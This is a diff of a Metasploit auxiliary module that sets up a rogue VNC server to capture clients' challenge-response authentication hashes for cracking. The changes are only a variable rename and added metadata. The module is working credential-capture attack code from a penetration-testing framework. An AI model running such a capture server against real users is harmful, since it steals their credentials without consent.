@@ -7,7 +7,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
-
   def initialize
     super(
       'Name' => 'Authentication Capture: VNC',
@@ -19,7 +18,12 @@ class MetasploitModule < Msf::Auxiliary
       'License' => MSF_LICENSE,
       'Actions' => [[ 'Capture', { 'Description' => 'Run VNC capture server' } ]],
       'PassiveActions' => [ 'Capture' ],
-      'DefaultAction' => 'Capture'
+      'DefaultAction' => 'Capture',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -44,17 +48,17 @@ class MetasploitModule < Msf::Auxiliary
     exploit
   end
 
-  def on_client_connect(c)
-    @state[c] = {
-      name: "#{c.peerhost}:#{c.peerport}",
-      ip: c.peerhost,
-      port: c.peerport,
+  def on_client_connect(client)
+    @state[client] = {
+      name: "#{client.peerhost}:#{client.peerport}",
+      ip: client.peerhost,
+      port: client.peerport,
       pass: nil,
       chall: nil,
       proto: nil
     }
 
-    c.put "RFB 003.007\n"
+    client.put "RFB 003.007\n"
   end
 
   def report_cred(opts)
@@ -84,38 +88,38 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def on_client_data(c)
-    data = c.get_once
+  def on_client_data(client)
+    data = client.get_once
     return if !data
 
-    peer = "#{c.peerhost}:#{c.peerport}"
+    peer = "#{client.peerhost}:#{client.peerport}"
 
     if data =~ /^RFB (.*)\n$/
-      @state[c][:proto] = Regexp.last_match(1)
-      if @state[c][:proto] == '003.007'
+      @state[client][:proto] = Regexp.last_match(1)
+      if @state[client][:proto] == '003.007'
         # for the 003.007 protocol we say we support the VNC sectype
         # and wait for the server to acknowledge it, before we send the
         # challenge.
-        c.put [0x0102].pack('n') # 1 sectype, unencrypted
-      elsif @state[c][:proto] == '003.003'
+        client.put [0x0102].pack('n') # 1 sectype, unencrypted
+      elsif @state[client][:proto] == '003.003'
         # for the 003.003 protocol we say we support the VNC sectype
         # and immediately send the challenge
         sectype = [0x00000002].pack('N')
-        c.put sectype
+        client.put sectype
 
-        @state[c][:chall] = @challenge
-        c.put @state[c][:chall]
+        @state[client][:chall] = @challenge
+        client.put @state[client][:chall]
       else
-        c.close
+        client.close
       end
     # the challenge was sent, so this should be our response
-    elsif @state[c][:chall]
-      c.put [0x00000001].pack('N')
-      c.close
+    elsif @state[client][:chall]
+      client.put [0x00000001].pack('N')
+      client.close
       print_good("#{peer} - Challenge: #{@challenge.unpack('H*')[0]}; Response: #{data.unpack('H*')[0]}")
-      hash_line = "*#{@state[c][:chall].unpack('H*')[0]}*#{data.unpack('H*')[0]}"
+      hash_line = "*#{@state[client][:chall].unpack('H*')[0]}*#{data.unpack('H*')[0]}"
       report_cred(
-        ip: c.peerhost,
+        ip: client.peerhost,
         port: datastore['SRVPORT'],
         service_name: 'vnc_client',
         user: '',
@@ -124,18 +128,18 @@ class MetasploitModule < Msf::Auxiliary
       )
 
     # we have got the protocol sorted out and have offered the VNC sectype (2)
-    elsif @state[c][:proto] == '003.007'
+    elsif @state[client][:proto] == '003.007'
       if (data.unpack('C')[0] != 2)
         print_error("#{peer} - sectype not offered! #{data.unpack('H*')}")
-        c.close
+        client.close
         return
       end
-      @state[c][:chall] = @challenge
-      c.put @state[c][:chall]
+      @state[client][:chall] = @challenge
+      client.put @state[client][:chall]
     end
   end
 
-  def on_client_close(c)
-    @state.delete(c)
+  def on_client_close(client)
+    @state.delete(client)
   end
 end
